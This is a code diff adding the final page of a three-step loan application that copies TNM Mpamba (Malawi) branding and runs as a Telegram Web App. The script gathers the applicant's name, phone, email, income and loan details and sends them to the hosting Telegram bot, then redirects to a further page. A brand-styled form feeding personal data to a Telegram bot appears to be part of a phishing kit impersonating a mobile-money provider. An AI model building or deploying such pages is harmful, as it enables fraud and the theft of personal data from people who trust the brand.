@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TNM Mpamba Malawi - Loan Application (Summary)</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --tnm-green: #38b000;       /* TNM Signature Green */
+            --tnm-green-dark: #2d9100;
+            --tnm-dark: #121820;        /* Deep Dark Text/Header Accent */
+            --tnm-accent-green: #258500;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-main: #111111;
+            --text-muted: #666666;
+            --input-border: #e2e8f0;
+            --btn-gray: #f0f2f5;
+            --btn-gray-text: #444444;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--tnm-green);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .back-btn-top {
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+        }
+
+        .header-title .region {
+            color: #ffffff;
+            font-size: 12px;
+            margin-left: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: #ffffff;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 20px;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 25px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 24px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Step Progress Bar (All 3 Steps Active) */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 32px;
+            width: 100%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 6px;
+            background-color: #e2e8f0;
+            border-radius: 3px;
+        }
+
+        .step-bar.active {
+            background-color: var(--tnm-green);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--tnm-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 2px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #111111;
+            outline: none;
+            width: 100%;
+            transition: border-color 0.2s;
+        }
+
+        .form-control::placeholder {
+            color: #a0aec0;
+        }
+
+        .form-control:focus {
+            border-color: var(--tnm-green-dark);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23121820' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 14px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        /* Summary Box with Green Accent Border */
+        .summary-card {
+            background-color: #f2fbf0;
+            border-left: 4px solid var(--tnm-green);
+            padding: 18px 16px;
+            border-radius: 12px;
+            margin: 10px 0 24px;
+            border-top: 1px solid #d4f0ce;
+            border-right: 1px solid #d4f0ce;
+            border-bottom: 1px solid #d4f0ce;
+        }
+
+        .summary-card h3 {
+            margin: 0 0 14px 0;
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--tnm-dark);
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed #c1e8ba;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-label {
+            color: #555555;
+            font-size: 13.5px;
+            font-weight: 500;
+        }
+
+        .summary-value {
+            font-weight: 700;
+            font-size: 13.5px;
+            color: #111111;
+            text-align: right;
+        }
+
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #e2e6ea;
+        }
+
+        .btn-next {
+            background-color: var(--tnm-green);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s, transform 0.1s;
+            box-shadow: 0 4px 12px rgba(56, 176, 0, 0.35);
+        }
+
+        .btn-next:active {
+            background-color: var(--tnm-green-dark);
+            transform: scale(0.99);
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Green Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Back</a>
+    <div class="header-title">
+        <span>tnm</span><span class="region">Mpamba</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Loan Application</h1>
+    <div class="subtext">Step 3 of 3</div>
+
+    <!-- Step Bar Progress Indicators (All 3 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <!-- Form & Dynamic Summary -->
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">Employment Status</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Employed" selected>Employed</option>
+                <option value="Self-Employed / Businessman">Self-Employed / Businessman</option>
+                <option value="Student">Student</option>
+                <option value="Unemployed">Unemployed</option>
+                <option value="Retired">Retired</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="income">Average Monthly Income (MWK)</label>
+            <input type="number" id="income" class="form-control" placeholder="e.g. 150000" required>
+        </div>
+
+        <div class="summary-card">
+            <h3>Application Summary</h3>
+
+            <div class="summary-row">
+                <span class="summary-label">Loan Amount:</span>
+                <span class="summary-value" id="sumAmount">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Loan Tenure:</span>
+                <span class="summary-value" id="sumDuration">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Loan Purpose:</span>
+                <span class="summary-value" id="sumPurpose">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Applicant:</span>
+                <span class="summary-value" id="sumName">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Phone Number:</span>
+                <span class="summary-value" id="sumPhone">--</span>
+            </div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">PREVIOUS</button>
+            <button type="submit" class="btn-next">SUBMIT APPLICATION</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 TNM Mpamba Limited - Malawi
+</div>
+
+<script>
+window.onload = () => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();   
+        tg.expand();
+    }
+
+    // Retrieve storage items from Step 1 and Step 2
+    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
+    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
+    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
+    const phone = localStorage.getItem('phone') || "";
+
+    // Format & Populate Summary
+    if (amount) {
+        const numAmount = Number(amount.replace(/\D/g, ''));
+        document.getElementById('sumAmount').innerText = numAmount 
+            ? `MWK ${numAmount.toLocaleString('en-US')}` 
+            : `MWK ${amount}`;
+    } else {
+        document.getElementById('sumAmount').innerText = "--";
+    }
+
+    document.getElementById('sumDuration').innerText = term ? term : "--";
+    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
+    document.getElementById('sumPhone').innerText = phone ? `+265 ${phone}` : "--";
+};
+
+function submitForm(event) {
+    event.preventDefault();
+    const tg = window.Telegram?.WebApp;
+    const incomeVal = document.getElementById('income').value.trim();
+
+    if (!incomeVal) {
+        alert("Please enter your average monthly income.");
+        return;
+    }
+
+    const data = {
+        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
+        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
+        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        email: localStorage.getItem('email'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: incomeVal,
+        currency: "MWK"
+    };
+
+    // Save final submission profile details
+    localStorage.setItem('jobStatus', data.jobStatus);
+    localStorage.setItem('income', incomeVal);
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => {
+            window.location.href = "/page5";
+        }, 300);
+    } else {
+        console.log("Submitted payload:", data);
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() {
+    window.location.href = "/page3";
+}
+</script>
+
+</body>
+</html>
